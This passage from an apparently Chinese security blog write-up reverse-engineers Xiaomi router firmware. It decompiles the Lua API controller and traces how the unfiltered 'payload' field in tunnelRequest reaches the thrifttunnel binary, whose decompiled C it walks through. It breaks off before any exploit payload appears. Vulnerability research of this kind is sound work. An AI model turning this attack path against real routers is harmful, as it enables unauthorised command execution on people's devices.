class="line">    source_path = res[i].strip(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    relative_path = os.path.relpath(source_path, source_base)</span><br><span class="line">    output_path = os.path.join(output_base, relative_path + <span class="string">&quot;.dis&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    os.makedirs(os.path.dirname(output_path), exist_ok=<span class="literal">True</span>)</span><br><span class="line">    </span><br><span class="line">    cmd = <span class="string">f&quot;java -jar /home/xidp/tools/unluac_miwifi/unluac.jar <span class="subst">&#123;source_path&#125;</span> &gt; <span class="subst">&#123;output_path&#125;</span>&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;反编译: <span class="subst">&#123;source_path&#125;</span> -&gt; <span class="subst">&#123;output_path&#125;</span>&quot;</span>)</span><br><span class="line">    os.system(cmd)</span><br></pre></td></tr></table></figure>

<p>下面我们打开反编译的 <code>/usr/lib/lua/luci/controller/api/xqdatacenter.lua</code><br>可以看到大致如下内容</p>
<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">local</span> L0, L1, L2, L3, L4, L5</span><br><span class="line">L0 = <span class="built_in">module</span></span><br><span class="line">L1 = <span class="string">&quot;luci.controller.api.xqdatacenter&quot;</span></span><br><span class="line">L2 = <span class="built_in">package</span></span><br><span class="line">L2 = L2.<span class="built_in">seeall</span></span><br><span class="line">L0(L1, L2)</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">L0</span><span class="params">()</span></span></span><br><span class="line">  <span class="keyword">local</span> L0, L1, L2, L3, L4, L5, L6</span><br><span class="line">  L0 = node</span><br><span class="line">  L1 = <span class="string">&quot;api&quot;</span></span><br><span class="line">  L2 = <span class="string">&quot;xqdatacenter&quot;</span></span><br><span class="line">  L0 = L0(L1, L2)</span><br><span class="line">  L1 = firstchild</span><br><span class="line">  L1 = L1()</span><br><span class="line">  L0.target = L1</span><br><span class="line">  L0.title = <span class="string">&quot;&quot;</span></span><br><span class="line">  L0.order = <span class="number">300</span></span><br><span class="line">  L0.sysauth = <span class="string">&quot;admin&quot;</span></span><br><span class="line">  L0.sysauth_authenticator = <span class="string">&quot;jsonauth&quot;</span></span><br><span class="line">  L0.index = <span class="literal">true</span></span><br><span class="line">  L1 = entry</span><br><span class="line">  L2 = &#123;&#125;</span><br><span class="line">  L3 = <span class="string">&quot;api&quot;</span></span><br><span class="line">  L4 = <span class="string">&quot;xqdatacenter&quot;</span></span><br><span class="line">  L2[<span class="number">1</span>] = L3</span><br><span class="line">  L2[<span class="number">2</span>] = L4</span><br><span class="line">  L3 = firstchild</span><br><span class="line">  L3 = L3()</span><br><span class="line">  L4 = _</span><br><span class="line">  L5 = <span class="string">&quot;&quot;</span></span><br><span class="line">  L4 = L4(L5)</span><br><span class="line">  L5 = <span class="number">300</span></span><br><span class="line">  L1(L2, L3, L4, L5)</span><br><span class="line">  L1 = entry</span><br><span class="line">  L2 = &#123;&#125;</span><br><span class="line">  L3 = <span class="string">&quot;api&quot;</span></span><br><span class="line">  L4 = <span class="string">&quot;xqdatacenter&quot;</span></span><br><span class="line">  L5 = <span class="string">&quot;request&quot;</span></span><br><span class="line">  L2[<span class="number">1</span>] = L3</span><br><span class="line">  L2[<span class="number">2</span>] = L4</span><br><span class="line">  L2[<span class="number">3</span>] = L5</span><br><span class="line"> ... </span><br><span class="line"> ...</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line">index = L0</span><br></pre></td></tr></table></figure>

<p>当然这样的可读性依旧不是很高，我们可以使用ai工具来帮助我们增加可读性<br>ai解析过后的内容大致如下</p>
<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 定义模块</span></span><br><span class="line"><span class="keyword">local</span> <span class="built_in">module</span> = <span class="built_in">require</span>(<span class="string">&quot;luci.controller.api.xqdatacenter&quot;</span>)</span><br><span class="line"><span class="built_in">package</span>.<span class="built_in">seeall</span>(<span class="built_in">module</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 主函数：定义路由节点和入口点</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">define_routes</span><span class="params">()</span></span></span><br><span class="line">    <span class="comment">-- 创建主节点</span></span><br><span class="line">    <span class="keyword">local</span> api_node = node(<span class="string">&quot;api&quot;</span>, <span class="string">&quot;xqdatacenter&quot;</span>)</span><br><span class="line">    api_node.target = firstchild()</span><br><span class="line">    api_node.title = <span class="string">&quot;&quot;</span></span><br><span class="line">    api_node.order = <span class="number">300</span></span><br><span class="line">    api_node.sysauth = <span class="string">&quot;admin&quot;</span></span><br><span class="line">    api_node.sysauth_authenticator = <span class="string">&quot;jsonauth&quot;</span></span><br><span class="line">    api_node.index = <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">-- 定义各个API端点</span></span><br><span class="line">    <span class="comment">-- 主入口点</span></span><br><span class="line">    entry(</span><br><span class="line">        &#123;<span class="string">&quot;api&quot;</span>, <span class="string">&quot;xqdatacenter&quot;</span>&#125;,</span><br><span class="line">        firstchild(),</span><br><span class="line">        _(<span class="string">&quot;&quot;</span>),</span><br><span class="line">        <span class="number">300</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="comment">-- 隧道请求处理</span></span><br><span class="line">    entry(</span><br><span class="line">        &#123;<span class="string">&quot;api&quot;</span>, <span class="string">&quot;xqdatacenter&quot;</span>, <span class="string">&quot;request&quot;</span>&#125;,</span><br><span class="line">        call(<span class="string">&quot;tunnelRequest&quot;</span>),</span><br><span class="line">        _(<span class="string">&quot;&quot;</span>),</span><br><span class="line">        <span class="number">301</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="comment">-- 设备识别</span></span><br><span class="line">    entry(</span><br><span class="line">        &#123;<span class="string">&quot;api&quot;</span>, <span class="string">&quot;xqdatacenter&quot;</span>, <span class="string">&quot;identify_device&quot;</span>&#125;,</span><br><span class="line">        call(<span class="string">&quot;identifyDevice&quot;</span>),</span><br><span class="line">        _(<span class="string">&quot;&quot;</span>),</span><br><span class="line">        <span class="number">302</span>,</span><br><span class="line">        <span class="number">8</span>  <span class="comment">-- 额外参数</span></span><br><span class="line">    )</span><br><span class="line">	... </span><br><span class="line">	...</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 将函数赋值给index变量</span></span><br><span class="line">index = define_routes</span><br></pre></td></tr></table></figure>

<p>分析结果可知<code>/api/xqdatacenter/request</code>这个API端点需要用户登录认证，并且用户名被设置为 <code>admin</code>，<code>sysauth_authenticator = &quot;jsonauth&quot;</code>即当<code>token</code>不存在或错误时，通过<code>authenticator.jsonauth</code>函数进行登录验证</p>
<p>对于具体的入口来说，定义<code>entry&#123;&#125;</code>内的第五个参数<code>flag</code>位为<code>0x01</code>（或<code>&amp;0x01=1</code>）代表不需要鉴权，这里<code>/api/xqdatacenter/request</code>这个入口没有设置<code>flag</code>位，因此表示需要鉴权。</p>
<p>下面来看 <code>tunnelRequest</code> 这个函数</p>
<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">L5</span><span class="params">()</span></span></span><br><span class="line">  <span class="keyword">local</span> L0, L1, L2, L3, L4, L5, L6, L7, L8</span><br><span class="line">  L0 = <span class="built_in">require</span></span><br><span class="line">  L1 = <span class="string">&quot;xiaoqiang.util.XQCryptoUtil&quot;</span></span><br><span class="line">  L0 = L0(L1)</span><br><span class="line">  L1 = L0.binaryBase64Enc</span><br><span class="line">  L2 = _UPVALUE0_</span><br><span class="line">  L2 = L2.formvalue_unsafe</span><br><span class="line">  L3 = <span class="string">&quot;payload&quot;</span></span><br><span class="line">  L2, L3, L4, L5, L6, L7, L8 = L2(L3)</span><br><span class="line">  L1 = L1(L2, L3, L4, L5, L6, L7, L8)</span><br><span class="line">  L2 = _UPVALUE1_</span><br><span class="line">  L2 = L2.THRIFT_TUNNEL_TO_DATACENTER</span><br><span class="line">  L2 = L2 % L1</span><br><span class="line">  L3 = <span class="built_in">require</span></span><br><span class="line">  L4 = <span class="string">&quot;luci.util&quot;</span></span><br><span class="line">  L3 = L3(L4)</span><br><span class="line">  L4 = _UPVALUE0_</span><br><span class="line">  L4 = L4.<span class="built_in">write</span></span><br><span class="line">  L5 = L3.exec</span><br><span class="line">  L6 = L2</span><br><span class="line">  L5 = L5(L6)</span><br><span class="line">  L6 = <span class="literal">nil</span></span><br><span class="line">  L7 = <span class="literal">false</span></span><br><span class="line">  L8 = <span class="literal">true</span></span><br><span class="line">  L4(L5, L6, L7, L8)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line">tunnelRequest = L5</span><br><span class="line"></span><br><span class="line">## AI增加可读性如下</span><br><span class="line"><span class="comment">-- tunnelRequest 函数：处理隧道请求，存在命令注入安全漏洞</span></span><br><span class="line">tunnelRequest = <span class="function"><span class="keyword">function</span><span class="params">()</span></span></span><br><span class="line">    <span class="comment">-- 导入所需模块</span></span><br><span class="line">    <span class="keyword">local</span> XQCryptoUtil = <span class="built_in">require</span>(<span class="string">&quot;xiaoqiang.util.XQCryptoUtil&quot;</span>)</span><br><span class="line">    <span class="keyword">local</span> luci_util = <span class="built_in">require</span>(<span class="string">&quot;luci.util&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">-- 不安全地获取payload参数（未经过滤）</span></span><br><span class="line">    <span class="keyword">local</span> raw_payload = _UPVALUE0_.formvalue_unsafe(<span class="string">&quot;payload&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">-- 对payload进行Base64编码</span></span><br><span class="line">    <span class="keyword">local</span> encoded_payload = XQCryptoUtil.binaryBase64Enc(raw_payload)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">-- 构造命令字符串（存在命令注入风险）</span></span><br><span class="line">    <span class="keyword">local</span> command = <span class="built_in">string</span>.<span class="built_in">format</span>(_UPVALUE1_.THRIFT_TUNNEL_TO_DATACENTER, encoded_payload)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">-- 执行系统命令</span></span><br><span class="line">    <span class="keyword">local</span> command_result = luci_util.exec(command)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">-- 将命令执行结果写入响应</span></span><br><span class="line">    _UPVALUE0_.<span class="built_in">write</span>(command_result, <span class="literal">nil</span>, <span class="literal">false</span>, <span class="literal">true</span>)</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p>函数主要作用是会对传入<code>payload</code>字段内的<code>JSON</code>数据用<code>binaryBase64Enc</code>函数进行<code>Base64</code>编码处理，然后拼接入<code>THRIFT_TUNNEL_TO_DATACENTER</code>所指代的命令中并执行</p>
<p>关键问题在于使用<code>formvalue_unsafe</code>函数获取<code>payload</code>字段内容，未过滤危险字符。</p>
<p>而<code>formvalue</code>函数中是有用<code>hackCheck</code>过滤危险字符的。这里可能是开发者考虑到<code>Json</code>格式的数据当中可能会用到某些字符所以不能直接过滤，但也没有进一步去做针对于<code>Json</code>的危险字符过滤，给了我们可趁之机。</p>
<p>在<code>/usr/lib/lua/xiaoqiang/common/XQConfigs.lua</code>中，可以找到<code>THRIFT_TUNNEL_TO_DATACENTER</code>的相关定义</p>
<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">L0 = <span class="string">&quot;thrifttunnel 0 &#x27;%s&#x27;&quot;</span></span><br><span class="line">THRIFT_TUNNEL_TO_DATACENTER = L0</span><br></pre></td></tr></table></figure>

<p>也就是最后执行的东西是 <code>thrifttunnel 0 base64(raw_payload)</code><br>所以下面我们就来看看这个<code>/usr/sbin/thriftunnel</code>二进制文件</p>
<h3 id="二进制文件内容分析"><a href="#二进制文件内容分析" class="headerlink" title="二进制文件内容分析"></a><strong>二进制文件内容分析</strong></h3><p>这里我们直接进入这个叫sub_AB08的函数，它是thriftunnel的主要程序内容</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_AB08</span><span class="params">(<span class="type">int</span> a1, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// x0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v4; <span class="comment">// x19</span></span><br><span class="line">  __int64 v5; <span class="comment">// x0</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// w0</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// w0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v8; <span class="comment">// x19</span></span><br><span class="line">  __int64 v10; <span class="comment">// [xsp+0h] [xbp+0h] BYREF</span></span><br><span class="line">  _QWORD v11[<span class="number">4</span>]; <span class="comment">// [xsp+48h] [xbp+48h] BYREF</span></span><br><span class="line">  _QWORD v12[<span class="number">4</span>]; <span class="comment">// [xsp+68h] [xbp+68h] BYREF</span></span><br><span class="line">  _BYTE v13[<span class="number">32</span>]; <span class="comment">// [xsp+88h] [xbp+88h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_1B6FC(v11, *(a2 + <span class="number">16</span>));</span><br><span class="line">    sub_1B6FC(&amp;v10 + <span class="number">104</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v11[<span class="number">1</span>] )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_1B6FC(v13, *(a2 + <span class="number">16</span>));</span><br><span class="line">      sub_1B9B0(v13, v12);</span><br><span class="line">      <span class="built_in">std</span>::<span class="built_in">string</span>::_M_dispose(v13);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">switch</span> ( atoi(*(a2 + <span class="number">8</span>)) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        v3 = sub_1BAE0(v12[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_31;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        v3 = sub_1BE38(v12[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_31;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        v4 = v12[<span class="number">0</span>];</span><br><span class="line">        uloop_init();</span><br><span class="line">        v5 = ubus_connect(<span class="number">0LL</span>);</span><br><span class="line">        qword_3E1D0 = v5;</span><br><span class="line">        <span class="keyword">if</span> ( v5 )</span><br><span class="line">        &#123;</span><br><span class="line">          uloop_fd_add(v5 + <span class="number">80</span>, <span class="number">9LL</span>);</span><br><span class="line">          <span class="keyword">if</span> ( ubus_lookup_id(qword_3E1D0, <span class="string">&quot;smartcontroller&quot;</span>, &amp;dword_3E1D8) )</span><br><span class="line">          &#123;</span><br><span class="line">            v8 = <span class="string">&quot;&#123;\&quot;code\&quot;:-100,\&quot;msg\&quot;:\&quot;connect failed\&quot;&#125;&quot;</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            blob_buf_init(&amp;qword_3E1E0, <span class="number">0LL</span>);</span><br><span class="line">            v6 = <span class="built_in">strlen</span>(v4);</span><br><span class="line">            blobmsg_add_field(&amp;qword_3E1E0, <span class="number">3LL</span>, <span class="string">&quot;request&quot;</span>, v4, (v6 + <span class="number">1</span>));</span><br><span class="line">            v7 = ubus_invoke_fd(</span><br><span class="line">                   qword_3E1D0,</span><br><span class="line">                   dword_3E1D8,</span><br><span class="line">                   <span class="string">&quot;process_request&quot;</span>,</span><br><span class="line">                   qword_3E1E0,</span><br><span class="line">                   sub_1B678,</span><br><span class="line">                   <span class="number">0LL</span>,</span><br><span class="line">                   <span class="number">5000LL</span>,</span><br><span class="line">                   <span class="number">0xFFFFFFFF</span>LL);</span><br><span class="line">            v8 = <span class="number">0LL</span>;</span><br><span class="line">            <span class="keyword">if</span> ( !byte_3E128 )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">switch</span> ( v7 )</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">                  v8 = <span class="string">&quot;&#123;\&quot;code\&quot;:-101,\&quot;msg\&quot;:\&quot;request server timeout\&quot;&#125;&quot;</span>;</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                  v8 = <span class="string">&quot;&#123;\&quot;code\&quot;:-102,\&quot;msg\&quot;:\&quot;invalid argument\&quot;&#125;&quot;</span>;</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">                  v8 = <span class="string">&quot;&#123;\&quot;code\&quot;:-103,\&quot;msg\&quot;:\&quot;server response no data\&quot;&#125;&quot;</span>;</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                  v8 = <span class="string">&quot;&#123;\&quot;code\&quot;:-104,\&quot;msg\&quot;:\&quot;unknown error\&quot;&#125;&quot;</span>;</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> ( qword_3E1D0 )</span><br><span class="line">            ubus_free();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v8 = <span class="string">&quot;&#123;\&quot;code\&quot;:-100,\&quot;msg\&quot;:\&quot;connect failed\&quot;&#125;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        uloop_done();</span><br><span class="line">        <span class="keyword">if</span> ( v8 )</span><br><span class="line">          <span class="built_in">fputs</span>(v8, <span class="built_in">stdout</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        v3 = sub_1CBA8();</span><br><span class="line">        <span class="keyword">goto</span> LABEL_31;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        v3 = sub_1CEBC();</span><br><span class="line">        <span class="keyword">goto</span> LABEL_31;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        v3 = sub_1D1D0();</span><br><span class="line">        <span class="keyword">goto</span> LABEL_31;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">        v3 = sub_1C4E8(v12[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_31;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">        v3 = sub_1C840(v12[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_31;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">        v3 = sub_1D4E4(v12[<span class="number">0</span>]);</span><br><span class="line">LABEL_31:</span><br><span class="line">        <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, v3);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span>::_M_dispose(v12);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span>::_M_dispose(v11);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 函数原型如下</span></span><br><span class="line">__int64 __fastcall <span class="title function_">sub_AB08</span><span class="params">(<span class="type">int</span> argc, __int64 argv)</span></span><br></pre></td></tr></table></figure>

<p>也就是说</p>
<ol>
<li><code>a1</code>是 <code>argc</code> 表示 <code>参数个数</code></li>
<li><code>a2</code>是 <code>argv</code> 表示 <code>参数数组指针</code></li>
</ol>
<h4 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a><strong>第一步</strong></h4><p>它检查程序调用参数是不是三个</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( a1 == <span class="number">3</span> ) <span class="comment">// 检查参数个数是否为3</span></span><br></pre></td></tr></table></figure>

<p>显然我们的 <code>thrifttunnel 0 base64_string</code> 符合要求</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">argv[<span class="number">0</span>] = <span class="string">&quot;thrifttunnel&quot;</span>  <span class="comment">// 程序名</span></span><br><span class="line">argv[<span class="number">1</span>] = <span class="string">&quot;0&quot;</span>            <span class="comment">// 操作码（case 0）</span></span><br><span class="line">argv[<span class="number">2</span>] = base64_string  <span class="comment">// Base64编码的payload</span></span><br></pre></td></tr></table></figure>

<h4 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a><strong>第二步</strong></h4><p><code>sub_1B6FC函数</code>的作用是复制</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sub_1B6FC(v11, *(a2 + <span class="number">16</span>));</span><br><span class="line">sub_1B6FC(&amp;v10 + <span class="number">104</span>, <span class="string">&quot;&quot;</span>);     </span><br></pre></td></tr></table></figure>

<p>它将 <code>*(a2 + 16)</code> 也就是 <code>argv[2]</code> 的内容复制到 <code>11</code> 中，说通俗点就是将 <code>base64_string</code> 的内容复制到 <code>v11</code> 中</p>
<h4 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a><strong>第三步</strong></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v11[<span class="number">1</span>] )</span><br><span class="line">&#123;</span><br><span class="line">  sub_1B6FC(v13, *(a2 + <span class="number">16</span>));</span><br><span class="line">  sub_1B9B0(v13, v12);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::_M_dispose(v13);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里先判断了一下 <code>v11</code> 是否为空，不为空就会进入 <code>if</code>，依旧复制 <code>base64_string</code> 的内容到 <code>v13</code> 中，然后作为第一个参数被传入<code>sub_1B9B0</code>函数中，而<code>sub_1B9B0</code>函数的第二个参数<code>v11</code>此时是空串</p>
<p>这里不再进入 <code>sub_1B9B0函数</code> 继续讲解，它的逻辑较为简单，结合ai分析可以知道它的功能大致就是 <code>解开base64编码</code>，然后将结果存放在 <code>v12</code> 中</p>
<h4 id="第四步"><a href="#第四步" class="headerlink" title="第四步"></a><strong>第四步</strong></h4><p>接下来是个 <code>switch</code><br>显然我们传入的 <code>argv[1] = 0</code>, 所以我们会进入 <code>case 0</code> 中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">  v3 = sub_1BAE0(v12[<span class="number">0</span>]);</span><br></pre></td></tr></table></figure>

<p>也就是随后会执行 <code>sub_1BAE0函数</code><br>而这里的 <code>v12[0]</code> 按照我们的分析，它应该是解码后的字符串，也就是我们用户输入的命令</p>
